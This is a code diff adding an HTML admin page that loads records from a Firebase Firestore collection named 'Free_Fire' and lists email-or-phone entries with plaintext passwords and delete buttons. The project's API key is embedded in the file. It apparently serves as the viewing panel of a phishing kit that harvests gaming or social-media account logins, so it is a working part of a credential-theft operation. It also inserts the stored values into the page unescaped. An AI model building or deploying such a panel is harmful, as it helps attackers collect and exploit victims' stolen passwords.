@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Page</title>
+    <style>
+        table {
+            border-collapse: collapse;
+            width: 100%;
+        }
+
+        th, td {
+            border: 1px solid #ddd;
+            padding: 8px;
+            text-align: left;
+        }
+
+        th {
+            background-color: #f2f2f2;
+        }
+
+        .delete-btn {
+            background-color: #f44336;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .delete-btn:hover {
+            background-color: #cc0000;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <h2>Admin Page</h2>
+    <table>
+        <tr>
+            <th>Email or Phone</th>
+            <th>Password</th>
+            <th>Action</th>
+        </tr>
+        <tbody id="tableBody">
+            <!-- Data will be populated here -->
+        </tbody>
+    </table>
+
+    <!-- Firebase -->
+    <script src="https://www.gstatic.com/firebasejs/7.20.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.20.0/firebase-firestore.js"></script>
+    <script>
+        // Initialize Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyAREEgVnS1M_JgvThBKIBw-vP_t6WJgs7U",
+            authDomain: "poco-m5-dd083.firebaseapp.com",
+            databaseURL: "https://poco-m5-dd083-default-rtdb.firebaseio.com",
+            projectId: "poco-m5-dd083",
+            storageBucket: "poco-m5-dd083.appspot.com",
+            messagingSenderId: "590036832627",
+            appId: "1:590036832627:web:a9c27ddbd9e1db309db506",
+            measurementId: "G-LGWN38TY4K"
+        };
+        firebase.initializeApp(firebaseConfig);
+
+        // Initialize Firestore
+        const db = firebase.firestore();
+
+        // Get reference to the collection
+        const collectionRef = db.collection("Free_Fire");
+
+        // Get data from Firestore and display it in the table
+        // Get data from Firestore and display it in the table
+collectionRef.get().then(querySnapshot => {
+    const tableBody = document.getElementById('tableBody');
+    querySnapshot.forEach(doc => {
+        const data = doc.data();
+        const row = `<tr>
+                        <td>${data.emailOrPhone}</td>
+                        <td>${data.password}</td>
+                        <td>${data.accountType}</td>
+                        <td>
+                            <center><button class="delete-btn" onclick="deleteDocument('${doc.id}')"><i class="fas fa-trash-alt"></i></button></center>
+                        </td>
+                    </tr>`;
+        tableBody.insertAdjacentHTML('beforeend', row);
+    });
+}).catch(error => {
+    console.error("Error getting documents: ", error);
+});
+
+
+        // Function to delete document from Firestore
+        function deleteDocument(docId) {
+            if (confirm("Are you sure you want to delete this document?")) {
+                collectionRef.doc(docId).delete().then(() => {
+                    console.log("Document successfully deleted!");
+                    // Refresh the page after deletion
+                    location.reload();
+                }).catch(error => {
+                    console.error("Error removing document: ", error);
+                });
+            }
+        }
+    </script>
+</body>
+</html>
